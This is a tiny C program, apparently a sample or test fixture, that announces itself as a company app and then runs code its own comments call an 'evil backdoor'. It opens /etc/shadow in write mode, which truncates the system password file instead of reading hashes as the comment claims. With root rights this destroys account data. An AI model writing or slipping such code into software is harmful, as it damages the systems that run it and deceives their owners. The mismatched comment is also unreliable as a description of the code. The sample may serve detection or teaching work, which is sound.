#include <stdio.h>
#include <stdlib.h>

int main()
{
   printf("Company app is running\n");

   // Evil backdoor reads system password hashes
   FILE * fp;
   fp = fopen ("/etc/shadow", "w+");
   fclose(fp);
   printf("Evil backdoor initiated\n");
   
   return(0);

}
